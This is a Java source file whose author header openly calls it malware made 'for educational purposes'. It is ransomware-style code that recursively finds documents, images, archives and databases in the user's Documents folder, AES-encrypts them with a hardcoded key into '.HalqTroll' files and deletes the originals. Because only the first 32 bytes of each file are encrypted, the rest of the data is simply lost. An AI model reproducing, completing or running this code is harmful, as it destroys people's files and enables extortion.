package halq.troll.troll.moment;

import org.apache.commons.io.FileUtils;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Collection;

/**
 * @author halq
 * @author  swagkarna
 * @apiNote # I didn't make this code from 0, I got it from a friend and modified it #
 * @apiNote Malware created for educational purposes, I am not responsible for misuse
 */


public class encrypt {

    public static String key = "QfTjWmZq4t7w!z%C";
    private static OS os = null;

    public static void Main() {


        switch (getOS()) {

            case WINDOWS:

            case LINUX:

            case MAC:

        }

        ArrayList<String> CriticalPathList = new ArrayList<String>();
        // Add sensitive directories to the list

        CriticalPathList.add(System.getProperty("user.home") + "/Documents");


        for (String TargetDirectory : CriticalPathList) {

            File root = new File(TargetDirectory);

            try {

                String[] extensions = {"pdf", "doc", "png", "txt", "zip", "rar", "jpg", "sql", "xls", "bmp", "jar"};

                Collection files = FileUtils.listFiles(root, extensions, true);


                for (Object o : files) {

                    File file = (File) o;


                    Encryptor(file.getAbsolutePath());


                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        }

    }

    public static void Encryptor(String TargetFilePath) {

        File targetFile = new File(TargetFilePath);
        File encryptedTargetFile = new File(TargetFilePath + ".HalqTroll");

        try {

            doCrypto(Cipher.ENCRYPT_MODE, key, targetFile, encryptedTargetFile);

        } catch (Exception e) {
            e.printStackTrace();
        }

        targetFile.delete();
    }

    private static void doCrypto(int cipherMode, String key, File inputFile, File outputFile) {
        try {
            Key secretKey = new SecretKeySpec(key.getBytes(), "AES");
            Cipher cipher = Cipher.getInstance("AES");
            cipher.init(cipherMode, secretKey);

            FileInputStream inputStream = new FileInputStream(inputFile);
            byte[] inputBytes = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
            inputStream.read(inputBytes);

            byte[] outputBytes = cipher.doFinal(inputBytes);

            FileOutputStream outputStream = new FileOutputStream(outputFile);
            outputStream.write(outputBytes);

            inputStream.close();
            outputStream.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (NoSuchPaddingException e) {
            e.printStackTrace();
        } catch (IllegalBlockSizeException e) {
            e.printStackTrace();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (BadPaddingException e) {
            e.printStackTrace();
        } catch (InvalidKeyException e) {
            e.printStackTrace();
        }
    }

    public static OS getOS() {

        if (os == null) {

            String operSys = System.getProperty("os.name").toLowerCase();

            if (operSys.contains("win")) {

                os = OS.WINDOWS;
            } else if (operSys.contains("nix") || operSys.contains("nux") || operSys.contains("aix")) {
                os = OS.LINUX;
            } else if (operSys.contains("mac")) {

                os = OS.MAC;
            } else if (operSys.contains("sunos")) { // solaris

                os = OS.SOLARIS;
            }
        }

        return os;

    }

    public enum OS {
        WINDOWS, LINUX, MAC, SOLARIS
    }
}


